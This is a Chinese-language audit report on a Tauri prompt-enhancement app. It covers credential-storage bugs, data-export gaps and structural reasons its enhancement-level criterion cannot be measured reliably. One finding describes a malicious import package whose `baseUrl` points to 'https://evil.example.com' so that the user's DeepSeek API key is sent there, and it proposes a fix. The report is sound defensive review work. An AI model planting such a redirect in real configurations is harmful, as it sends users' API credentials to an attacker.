1. **原报告称 `bench_report.py:191`「失败越多胜率越高」，表述不准。** 精确机制：`judged = len(bucket["composites"])`（该模型成功产出 composite 的样本数）与 `wins`（该模型在 prompt 级对决中严格最高且无并列的 prompt 数）**是两个不同的总体**；① 并列最高时该 prompt 不计入任何模型的 `wins`，却仍计入别人的 `judged`；② 其他模型失败会把「本会输掉的 prompt」变成「自动获胜」，而失败方的样本数不进任何分母 ⇒ **竞争者失败越多，幸存者的 win_rate 越高**。结论不变。

## 三、缺点与风险（按严重度排序）

### 【P0-1 · 阻断】v0.3.5 的凭据修复打断了合法保存路径 —— API Key 根本无法写入

- **文件:行**：`src-tauri/src/models.rs:143-144`、`src-tauri/src/storage.rs:143-149`、`src-tauri/src/lib.rs:50-58`、`src/App.tsx:299-300`、`src/lib.ts:97-103`
- **机制**：`models.rs:143-144` 对 `api_key` 加了 `skip_deserializing`：
  ```rust
  #[serde(default, skip_serializing, skip_deserializing)]
  pub api_key: Option<String>,
  ```
  `skip_deserializing` 对**所有入参方向**生效。而前端保存 Key 走的正是同一条反序列化入口：
  ```ts
  // src/App.tsx:299
  const next = { ...provider, models, hasApiKey: Boolean(apiKeyDraft || provider.hasApiKey), apiKey: apiKeyDraft || undefined };
  ```
  → `save_provider_config` 命令收到的 `config.api_key` **恒为 `None`** → `storage.rs:144` 的 `if let Some(api_key) = config.api_key.as_ref()` 永不成立 → **`set_password` 永远不被调用**。
- **后果**：新装用户填入 Key → 点"验证并保存" → `validate_provider` 联网验证通过 → 前端 `App.tsx:300` 显示"**连接验证成功，配置已保存**" → Rust 侧静默丢弃 → `storage.rs:152` 重算 `has_api_key = self.api_key().is_ok()` 得 false → 用户点"增强" → `provider.rs:39` 的 `state.storage.api_key()?` 报错"尚未配置 DeepSeek API Key"。
  **全新安装的应用完全不可用，且 UI 主动谎报"已保存"。** 老用户因凭据管理器里还留着 v0.3.4 写入的 Key 而侥幸可用，但也**永远无法更新 Key**。
- **判定**：**确定**。独立探针（serde 1.0.229，与 `Cargo.lock` 一致）实测：`CASE1 frontend api_key = None / key survived? = false`。
- **修复方向**：不能简单删掉 `skip_deserializing`——那会重开 §P0-2 的投毒路径。正确做法是**把"保存凭据"与"导入配置"拆成两条独立命令/独立 DTO**（保存命令收 `api_key: Option<String>` 独立参数；导入命令继续用 `skip_deserializing` 的 `ProviderConfig`）。

### 【P0-2 · 阻断】导入包可改写 `base_url`，把用户真实 API Key 外发给攻击者

- **文件:行**：`src-tauri/src/storage.rs:427`（`import_data` 调 `save_provider_config`）、`src-tauri/src/storage.rs:143-164`（该函数不校验 URL）、`src-tauri/src/provider.rs:53`、`:74-79`
- **机制**：URL 校验 `validate_base_url` 只存在于 Tauri 命令层（`lib.rs:55`、`:193-200`），**`Storage::save_provider_config` 本身不校验**。而 `import_data` 直接调用它：
  ```rust
  self.save_provider_config(&provider)?;   // storage.rs:427，base_url 原样落库
  ```
  随后增强请求用被改写的 `base_url` 并**携带真实 Key**：
  ```rust
  let endpoint = format!("{}/chat/completions", config.base_url.trim_end_matches('/'));
  state.client.post(&endpoint).bearer_auth(&api_key)   // provider.rs:53, 77
  ```
- **后果**：用户在设置页点"导入数据"、选中一个第三方"备份包"，其 `provider.json` 写 `baseUrl: "https://evil.example.com"` → **下一次增强，用户的 DeepSeek API Key 作为 Bearer token 发给攻击者**。因为导入路径无任何校验，连 `http://` 明文地址也接受。
- **判定**：**确定**（全链路可追溯，无中间校验）。**v0.3.5 只防住了"Key 的值"被投毒，没防住"Key 的目的地"被投毒。**
- **修复方向**：把 `validate_base_url` 下沉到 `Storage::save_provider_config`（让所有写入路径共享同一校验），或导入路径单独用一份白名单化的 provider 配置。

### 【P0-3 · 阻断】导出包只含最近 500 条历史，UI 却报告"已导出 N 条"

- **文件:行**：`src-tauri/src/storage.rs:327`、`:218`、`:366`；`src/lib.ts:181-191`


## 四、专项：哪些代码结构让「判据」这件事难以被可靠地钉住？

> 这是本次审查最想回答的问题。三次尝试改判据/加投票都失败了，**失败的原因不在判据本身，在承载判据的结构**。

### 1. 判据是模型 JSON 里的一个字符串字段，没有独立信号源，也没有独立决策

`enhancement_level` 由模型在**同一次前向过程**里与 `primary_prompt`、`changes`、`suggestions`、`risk_flags`、`candidates` 一起生成（`prompts.rs:50-63` 的 JSON 字段清单）。它不是"先判定、再执行"的两步结构，而是**判定与产出耦合在一次采样里**。
⇒ 一次采样的随机性会同时污染"写得好不好"和"判得对不对"，**两个本该分开测量的量被绑死了**。投票实测报告 §三 观察到的"双峰"（同一次点击内部两次采样必然一致、跨点击却跳档）正是这个耦合的产物。

### 2. 三层各自兜底，且**兜底方向一致偏向"已增强"**

| 层 | 位置 | 缺失时 |
|---|---|---|
| Rust serde | `models.rs:53-54`、`:95-97` | `enhancement_level = "light"` |
| Python 复刻 | `enhancer.py:204-207` | `enhancement_level = "light"` |
| 前端 TS | `lib.ts:227-228` | `enhancement_level = "light"` |

⇒ **"模型没给出判断"在系统里等于"轻度增强"。** 缺失从不解释为"未知"或"未增强"。**这使得"缺数据被算成通过"在判据层是系统性的（B2/B4），而不仅仅是几个 bug。** 更要命的是：**每次缺一个字段，系统的方向都是"假装增强了"，不是"假装没增强"** —— 对一个"该不该增强"的判据来说，这是最坏的方向。

### 3. 判据的**温度**是判据的隐藏参数，却散落 4 处手工配置、0 处自动校验（P0-5）

温度直接决定 none/light 边界上的采样分布。它不在任何一份"判据"文档里，不在任何一条断言里，只是 4 个文件里的一个数字。**这意味着：任何关于"判据是否稳定"的结论，都无法自动回答"这次跑的温度和线上一样吗"。**

### 4. 判据的**测量工具**不在版本控制里（P0-4）

这是我认为最致命的一条。三次尝试的证据全部依赖"脚本 + gitignore 掉的产物"。**没有可复现的测量，就没有可归因的迭代。** 三次尝试的失败看起来是"判据难"，实际上是"每次尝试都没留下可对照的基线"，于是：
- 第一次（测稳定性）的结论无从复核；
- 第二次（测投票）的脚本也丢了，与第一次**无法对照同一批样本**；
- 第三次（改温度）引用了前两次的数字，但没人能验证那些数字是同一批样本、同一温度、同一 prompt 版本下产生的。

**⇒ 这就是"三次都失败"的机制性解释。**

### 5. 判据**从未被物化成一个可回归的对象**

`enhancement_level` 在产品里是"一个字符串字段"，在历史里是"一个可选字段"（`App.tsx:196` 存进 `HistoryRecord.enhancementLevel`），在评测里是"一个分布直方图"（`verify_enhance.py:390-391`）。**它从来没有成为"判定输入 → 判定结果 → 判定依据 → 判定版本 → 判定置信度"这样一个可以单独版本化、单独回归、单独做 A/B 的对象。** 而 `level_vote.py` 已经把"一致度"设计成了产物的��部分（`LevelVote.votes` / `voted` / `is_uncertain` / `is_tie`）—— **这是全仓最接近正确形态的东西，但它没有接进产品，也没有接进任何流水线。**

### 6. 判据与结论之间缺一条"同一条数据只算一次"的保证

从 `enhancement_level` 到"档位恰当"要穿过：模型的 JSON → `normalize_result` 兜底 → `judge_dimension_restraint` 的 `acceptable` 映射 → `summarize` 的分桶。**这条链上每一环都会改变语义，而且每一环的改变都不留痕**：
- `normalize_result` 把"缺失"变成"light"（不留痕）；
- `acceptable` 映射把"none"和"light"合并（不留痕）；
- `summarize` 用 `not r.get("error")` 过滤（不留痕，样本数只体现在 `judged` 字段里）。

⇒ **最终那个"60/60 恰当"的数字，无法回答"其中有多少条是真的判对了、多少条是兜底出来的、多少条是被映射合并掉的"。**

### 7. 一个"钉住判据"的最小可行结构（建议）

不必重写。**把上面 1-6 收敛成三件小事**：

1. **给判据一个独立的一等对象**：`{input_hash, level, basis, prompt_version, model, temperature, sample_count, agreement}`。产品侧每次增强写一条；评测侧拿它做回归。
2. **让 `level` 可以是"未知"**：三层兜底从 `light` 改成 `null`/`"unknown"`，并让**"未知"在报表里单独成桶、且不参与"恰当"判定**。这一步就关掉了 B2/B4 两处 fail-open。
3. **把"测量脚本 + 原始数据"与"结论"同版本提交**：沿用 `docs/evaluation-data-v032/` 的既有做法，产物名带 `prompt_version + model + temperature + samples_hash + timestamp`。

**这三条都不需要新的模型能力、不需要投票、不需要改判据措辞。** 它们的共同点是：**把"判据"从散文和散落的数字里搬到一个可被断言、可被 diff、可被回归的载体上。** 而这恰好是 `test_enhancer.py:40-45`（SYSTEM_PROMPT 逐字断言）已经在本仓做对的那件事 —— 范式现成。
